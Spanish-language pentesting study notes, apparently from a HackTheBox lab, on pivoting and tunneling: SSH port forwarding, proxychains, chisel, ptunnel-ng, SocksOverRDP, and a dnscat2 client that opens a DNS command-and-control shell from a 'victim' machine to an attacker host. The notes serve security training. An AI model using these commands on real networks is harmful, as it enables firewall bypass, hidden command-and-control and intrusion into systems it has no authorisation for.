PORT FORWARDING

El port forwarding es una técnica que nos permite redirigir la respuesta de comunicación de un puerto a otro, esto nos sirve mucho para aplicar un bypass al firewall y usar otros servicios que externamente no vemos.

Podemos ejecutra un local port forwarding por medio de ssh

1

ssh -L 1234:localhost:3306 Ubuntu@10.129.202.64

Al poner ifconfig podemos ver lo que tenemos diferentes NICs.

Uno conectado a nuestro host de ataque (ens192) Uno comunicándose con otros hosts dentro de una red diferente (ens224) La interfaz de bucle invertido (lo).

En este caso se sabe que puerto es el que tenemos abierto localmente pero cuando no se sabe podremos hacer un un SSH Tunneling con SOCKS Proxy que es te último es un protocolo que nos ayuda a comunicarnos con los servidores que tienen restricciones de firewall.

Para crear un Dynamic Port Forwarding podemos utilizar ssh y mediante la herramienta proxychains podemos hacer que todos los paquetes de las herramientas pasen por el puerto 9050. Usando proxychains, también podemos ocultar la dirección IP del host solicitante, ya que el host receptor solo verá la IP del host pivote.

Para informar a proxychains que debemos usar el puerto 9050, debemos modificar el archivo de configuración de proxychains ubicado en /etc/proxychains.conf. Podemos agregar socks4 127.0.0.1 9050a la última línea si aún no está allí.

# defaults set to "tor"
socks4 	127.0.0.1 9050

Túnel DNS con Dnscat2

Dnscat2 es una herramienta de tunelización que utiliza el protocolo DNS para enviar datos entre dos hosts. Utiliza un cifrado Command-&-Control( C&CoC2) canal y envía datos dentro de registros TXT dentro del protocolo DNS.

1

sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache

En la máquina víctima montamos el cliente

1
2
3

git clone https://github.com/lukebaggett/dnscat2-powershell.git
PS C:\htb> Import-Module .\dnscat2.ps1
PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd

CHISEL

Con chisel podemos crearnos un tunel que manda información por HTTP mediante ssh, para eso montamos el servicio en la máquina víctima y después un cliente en la nuestra para tener acceso a los demas puertos de la máquina víctima. Descargamos la repo de github y le hacemos un go build. nos pasamos el archivo mediante scp y ejecutamos commo servidor en la máquina víctima.

PTUNNEL-NG

Crea un tunel ICMP por SOCKS

1
2
3
4
5

git clone https://github.com/utoni/ptunnel-ng.git
sudo ./autogen.sh
scp -r ptunnel-ng ubuntu@10.129.202.64:~/
sudo ./ptunnel-ng -r10.129.202.64 -R22 #MÁQUINA VÍCTIMA
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22 #MÁQUINA ATACANTE

Con esto podemos crearnos una sesión dinámica en ssh para obtener un port forwarding y conectarnos a más servicios

1

ssh -D 9050 -p2222 -lubuntu 127.0.0.1

SocksOverRDP

Hay situaciones donde solo tenemos disponibles el sistema operativo windows, por lo que es necesario saber herramientas que nos ayuden a migrar a otra máquina.

1

C:\Users\htb-student\Desktop\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll

Después usamos la otra máquina a donde queremos pivotear para ejecutar SocksOverRDP-Server.exe, después usamos proxifier para configurar un proxy en en localhost por el puerto

  1. Y ya podríamos conectarnos por RDP.
